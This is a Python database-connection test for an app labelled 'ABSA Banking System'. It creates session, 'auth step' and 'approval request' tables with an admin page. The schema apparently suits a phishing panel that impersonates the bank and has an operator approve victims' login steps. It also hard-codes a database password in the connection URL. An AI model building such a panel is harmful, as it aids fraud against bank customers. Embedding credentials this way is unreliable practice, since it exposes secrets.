#!/usr/bin/env python3
"""
Database Connection Test for ABSA Banking System
Tests connection to the PostgreSQL database and initializes tables
"""

import os
import sys
from datetime import datetime

# Add the current directory to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

def test_database_connection():
    """Test the PostgreSQL database connection"""
    try:
        # Set the DATABASE_URL environment variable
        os.environ['DATABASE_URL'] = 'postgresql://capitalxdb_user:cErzFTrAr2uuJ180NybFaWBVnr2gMLdI@dpg-d30rrh7diees7389fulg-a/capitalxdb'
        
        # Import after setting environment variable
        from app import app, db, UserSession, AuthStep, ApprovalRequest
        
        print("🔌 Testing PostgreSQL database connection...")
        print(f"📍 Database URL: {app.config['SQLALCHEMY_DATABASE_URI']}")
        
        with app.app_context():
            # Test basic connection
            print("⚡ Testing database connection...")
            db.engine.execute('SELECT 1')
            print("✅ Database connection successful!")
            
            # Create all tables
            print("🔧 Creating database tables...")
            db.create_all()
            print("✅ Database tables created successfully!")
            
            # Test table creation by checking if tables exist
            inspector = db.inspect(db.engine)
            tables = inspector.get_table_names()
            
            expected_tables = ['user_sessions', 'auth_steps', 'approval_requests']
            for table in expected_tables:
                if table in tables:
                    print(f"✅ Table '{table}' exists")
                else:
                    print(f"❌ Table '{table}' missing")
                    return False
            
            # Test inserting sample data
            print("🧪 Testing data insertion...")
            
            # Create a test session
            test_session = UserSession(
                id='test-session-12345',
                ip_address='127.0.0.1',
                status='active'
            )
            db.session.add(test_session)
            db.session.commit()
            print("✅ Test session created")
            
            # Create a test auth step
            test_step = AuthStep(
                session_id='test-session-12345',
                step_name='Test Step',
                step_data='{"test": "data"}',
                ip_address='127.0.0.1'
            )
            db.session.add(test_step)
            db.session.commit()
            print("✅ Test auth step created")
            
            # Create a test approval request
            test_request = ApprovalRequest(
                id='test-request-12345',
                session_id='test-session-12345',
                step_name='Test Step',
                next_url='/test',
                user_data='{"test": "approval"}',
                ip_address='127.0.0.1'
            )
            db.session.add(test_request)
            db.session.commit()
            print("✅ Test approval request created")
            
            # Query the data back
            print("🔍 Testing data retrieval...")
            session_count = UserSession.query.count()
            step_count = AuthStep.query.count()
            request_count = ApprovalRequest.query.count()
            
            print(f"📊 Database statistics:")
            print(f"   - User Sessions: {session_count}")
            print(f"   - Auth Steps: {step_count}")
            print(f"   - Approval Requests: {request_count}")
            
            # Clean up test data
            print("🧹 Cleaning up test data...")
            db.session.delete(test_request)
            db.session.delete(test_step)
            db.session.delete(test_session)
            db.session.commit()
            print("✅ Test data cleaned up")
            
            return True
            
    except Exception as e:
        print(f"❌ Database test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    print("=" * 60)
    print("🏦 ABSA Banking System - Database Connection Test")
    print("=" * 60)
    print(f"⏰ Test started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    
    if test_database_connection():
        print()
        print("=" * 60)
        print("🎉 Database connection test PASSED!")
        print("🚀 Your PostgreSQL database is ready for production!")
        print("=" * 60)
        print("📋 Next steps:")
        print("   1. Run: python app.py")
        print("   2. Visit: http://localhost:5000")
        print("   3. Admin: http://localhost:5000/admin")
        print("   4. All data will be stored in PostgreSQL")
        print("=" * 60)
        return True
    else:
        print()
        print("=" * 60)
        print("💥 Database connection test FAILED!")
        print("🔧 Please check:")
        print("   1. Database URL is correct")
        print("   2. Database server is running")
        print("   3. Network connectivity")
        print("   4. Database credentials are valid")
        print("=" * 60)
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)